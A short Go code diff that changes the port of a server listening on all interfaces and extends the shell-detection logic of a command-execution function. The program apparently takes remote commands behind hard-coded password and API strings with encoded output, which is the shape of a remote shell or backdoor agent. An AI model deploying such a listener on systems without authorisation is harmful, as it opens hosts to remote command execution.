@@ -21,7 +21,7 @@ import (
 	"time"
 )
 
-const LISTEN = "0.0.0.0:62847"
+const LISTEN = "0.0.0.0:62848"
 const PWD = "S1lLyAQNXYUASEDFLVBWSFWECSSVS1lLy"
 const API = "S1lLyXCVBRTSDBAVWERHHWARTGJRS1lLy"
 const ENCODER = "base64"           // "" or "base64" or "hex"
@@ -317,30 +317,36 @@ func ExecuteCommandCode(cmdPath string, command string) string {
 		if err2 == nil {
 			shell = sh2.Name()
 		} else {
-			sh3, err3 := os.Stat("/bin/zsh")
+			sh3, err3 := os.Stat("/bin/psh")
 			if err3 == nil {
 				shell = sh3.Name()
 			} else {
-				sh4, err4 := os.Stat("/bin/psh")
+				sh4, err4 := os.Stat("/bin/zsh")
 				if err4 == nil {
 					shell = sh4.Name()
-				} else { //还是没有能用的shell
-					fi, err5 := os.Open("/etc/shells")
-					if err5 != nil {
-						shell = "sh"
-					}
-					defer fi.Close()
-					br := bufio.NewReader(fi)
-					for {
-						line, _, c := br.ReadLine()
-						if c == io.EOF {
-							break
-						}
-						if strings.Index(strings.TrimSpace(string(line)), "#") == 0 {
-							continue
+				} else {
+					sh5, err5 := os.Stat("/bin/ash")
+					if err5 == nil {
+						shell = sh5.Name()
+					} else { //还是没有能用的shell
+						fi, err6 := os.Open("/etc/shells")
+						defer fi.Close()
+						if err6 != nil {
+							shell = "sh"
 						} else {
-							shell = strings.TrimSpace(string(line))
-							break
+							br := bufio.NewReader(fi)
+							for {
+								line, _, c := br.ReadLine()
+								if c == io.EOF {
+									break
+								}
+								if strings.Index(strings.TrimSpace(string(line)), "#") == 0 {
+									continue
+								} else {
+									shell = strings.TrimSpace(string(line))
+									break
+								}
+							}
 						}
 					}
 				}
